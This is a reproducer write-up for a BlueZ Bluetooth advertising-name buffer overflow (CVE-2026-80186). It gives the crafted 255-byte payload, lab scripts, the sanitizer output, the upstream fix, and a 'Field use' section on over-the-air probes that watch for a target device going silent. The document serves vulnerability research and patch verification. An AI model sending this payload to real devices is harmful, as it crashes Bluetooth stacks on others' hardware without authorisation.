# CVE-2026-80186 reproducer

[English](eir-2026-80186.md) · [Deutsch](../de/eir-2026-80186.md)

## Bug

`name2utf8()` in `src/eir.c` copies `len` bytes into
`char utf8_name[HCI_MAX_NAME_LENGTH + 2]`. `HCI_MAX_NAME_LENGTH` is 248, so the
buffer is 250 bytes. `eir_parse()` accepts a field length up to 254, so
`strncpy()` writes up to 254 bytes and leaves the buffer unterminated. The
following `g_strstrip()` and `g_strdup()` then read past the end.

## Payload

A 255-byte advertising payload:

```text
fe 09 ff ff ... ff
```

`0xfe` is the AD length (254), `0x09` is Complete Local Name, and the 253 name
bytes are all `0xff`. `0xff` is invalid UTF-8, so `g_utf8_validate()` fails and
the `strncpy()` path runs.

## Run

```sh
lab/scripts/build-bluez.sh
lab/scripts/repro-eir.sh
```

Expected vulnerable output:

```text
ERROR: AddressSanitizer: stack-buffer-overflow
  #1 name2utf8 src/eir.c:136
  #2 eir_parse src/eir.c:303
```

Expected patched output: `name_len=253 parsed_len=0` and exit 0.

## Fix

Clamp before the copy:

```c
if (len > HCI_MAX_NAME_LENGTH)
    len = HCI_MAX_NAME_LENGTH;
```

Upstream: commit `381b5d0d208972586282116d333865ba93b8dec2`, 19 August 2026.

## Field use

The bench probe `eir_overflow` advertises this payload from an extended
advertising set, connects, and watches the target's advertising for silence. A
crash is inferred, not read from a log. Repeat with `eir_overflow_scan_response`
and `eir_overflow_legacy` to cover the other delivery paths.
